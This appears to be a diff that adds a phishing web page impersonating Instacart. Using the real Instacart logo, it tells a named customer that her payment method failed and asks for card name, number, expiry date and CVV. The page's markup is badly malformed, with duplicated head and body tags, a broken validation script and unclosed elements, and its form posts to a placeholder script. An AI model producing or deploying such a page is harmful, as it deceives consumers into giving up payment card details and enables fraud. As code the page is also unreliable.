@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <script>
+    function validateForm() {
+      var x = document.forms["input"]["Card Number"]["EXP MM/YY"]["CVV"].value;
+      if (x == "" || x == null) {
+        alert("Please update card details");
+        return false;
+      }
+    }
+  </script>
+
+  <head>
+
+  <body>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <title>instacart - updatepaymen</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  <img
+    src="https://www.instacart.com/assets/beetstrap/brand/2022/instacart-logo-color-6678cb82d531f8910d5ba270a11a7e9b56fc261371bda42ea7a5abeff3492e1c.svg">
+  <h2>Judith, We are having trouble updating your payment method</h2>
+  <p>Please update your card details</p>
+  <div class="col-50">
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+      body {
+        font-family: Arial;
+        font-size: 17px;
+        padding: 8px;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      .row {
+        display: -ms-flexbox;
+        /* IE10 */
+        display: flex;
+        -ms-flex-wrap: wrap;
+        /* IE10 */
+        flex-wrap: wrap;
+        margin: 0 -16px;
+      }
+
+      .col-25 {
+        -ms-flex: 25%;
+        /* IE10 */
+        flex: 25%;
+      }
+
+      .col-50 {
+        -ms-flex: 50%;
+        /* IE10 */
+        flex: 50%;
+      }
+
+      .col-75 {
+        -ms-flex: 75%;
+        /* IE10 */
+        flex: 75%;
+      }
+
+      .col-25,
+      .col-50,
+      .col-75 {
+        padding: 0 16px;
+      }
+
+      .container {
+        background-color: #f2f2f2;
+        padding: 5px 20px 15px 20px;
+        border: 1px solid lightgrey;
+        border-radius: 3px;
+      }
+
+      input[type=text] {
+        width: 100%;
+        margin-bottom: 20px;
+        padding: 12px;
+        border: 1px solid #ccc;
+        border-radius: 3px;
+      }
+
+      label {
+        margin-bottom: 10px;
+        display: block;
+      }
+
+      .icon-container {
+        margin-bottom: 20px;
+        padding: 7px 0;
+        font-size: 24px;
+      }
+
+      .btn {
+        background-color: #04AA6D;
+        color: white;
+        padding: 12px;
+        margin: 10px 0;
+        border: none;
+        width: 100%;
+        border-radius: 3px;
+        cursor: pointer;
+        font-size: 17px;
+      }
+
+      .btn:hover {
+        background-color: #45a049;
+      }
+
+      a {
+        color: #2196F3;
+      }
+
+      hr {
+        border: 1px solid lightgrey;
+      }
+
+      span.price {
+        float: right;
+        color: grey;
+      }
+
+      /* Responsive layout - when the screen is less than 800px wide, make the two columns stack on top of each other instead of next to each other (also change the direction - make the "cart" column go on top) */
+      @media (max-width: 800px) {
+        .row {
+          flex-direction: column-reverse;
+        }
+
+        .col-25 {
+          margin-bottom: 20px;
+        }
+      }
+    </style>
+    </head>
+
+    <body>
+
+      <div class="row">
+        <div class="col-75">
+          <div class="container">
+            <form action="/action_page.php">
+
+              <div class="row">
+                <div class="col-50">
+
+                  <label for="fname">Accepted Cards</label>
+                  <div class="icon-container">
+                    <i class="fa fa-cc-visa" style="color:navy;"></i>
+                    <i class="fa fa-cc-amex" style="color:blue;"></i>
+                    <i class="fa fa-cc-mastercard" style="color:red;"></i>
+                    <i class="fa fa-cc-discover" style="color:orange;"></i>
+                  </div>
+                  <label for="cname">Name on Card</label><input type="text" id="cname" name="cardname" placeholder="Judith Christman">
+    <!-- Card Number -->
+    <input type="text" class="card-number" placeholder="Card Number">
+    <!-- Date Field -->
+    <div class="date-field">
+      <div class="month">
+        <select name="Month">
+          <option value="january">January</option>
+          <option value="february">February</option>
+          <option value="march">March</option>
+          <option value="april">April</option>
+          <option value="may">May</option>
+          <option value="june">June</option>
+          <option value="july">July</option>
+          <option value="august">August</option>
+          <option value="september">September</option>
+          <option value="october">October</option>
+          <option value="november">November</option>
+          <option value="december">December</option>
+        </select>
+      <div class="year">
+        <select name="Year">
+          <option value="2022">2022</option>
+          <option value="2023">2023</option>
+          <option value="2024">2024</option>
+          <option value="2024">2024</option>
+          <option value="2025">2025</option>
+          <option value="2026">2026</option>
+          <option value="2027">2027</option>
+          <option value="2028">2028</option>
+          <option value="2029">2029</option>
+           <option value="2030">2030</option>
+        </select>
+      </div>
+    </div>
+ 
+    <!-- Card Verification Field -->
+    <div class="card-verification">
+      <div class="cvv-input">
+        <input type="text" placeholder="CVV">
+      </div>
+      <div class="cvv -details">
+    <!-- Buttons -->
+ 
+    <button type="button" name="button"> <a href="instacart.html" target="-"#">Update now</a>
+
+  </div>
+</form>
